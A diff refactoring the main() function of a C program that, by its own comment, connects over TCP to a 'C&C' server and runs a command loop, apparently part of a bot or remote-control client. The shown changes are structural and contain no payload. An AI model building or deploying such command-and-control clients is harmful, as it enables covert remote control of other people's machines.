@@ -14,43 +14,49 @@
 #include <signal.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <string.h>
 
 #ifdef _WIN32
 #include <winsock2.h>
 #endif
 
 #include "common.h"
-#include "main.h"
+#include "config.h"
 #include "command.h"
 #include "parser.h"
+#include "base64.h"
+
+#include "main.h"
 
 int main(int argc, char *argv[])
 {
-
     // Connect to the C&C over TCP.
     if (argc == 3) {
         LOG("Starting up...\n");
 
-        // On Windows, we must initialize the sockets library.
 #ifdef _WIN32
+
+        // On Windows, we must initialize the sockets library.
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
             LOG("Failed to initialize Windows sockets, error code: %d\n", GetLastError());
             return 0;
         }
+
 #endif
 
         // Command line arguments are the hostname and port.
-        char *hostname = argv[1];
-        int port = atoi(argv[2]);
+        Settings s;
+        memset(&s, 0, sizeof(s));
+        strncpy(s.hostname, argv[1], sizeof(s.hostname));
+        s.port = atoi(argv[2]);
 
         // Initialize the parser.
-        Parser parser;
-        Parser *p = &parser;
-        parser_init(p, hostname, port, NULL, NULL);
+        Parser p;
+        parser_init(&p, &s);
 
         // Launch the main command loop.
-        while (command_loop(p) == 0) {}
+        while (command_loop(&p) == 0) {}
     }
 
     // Quit.
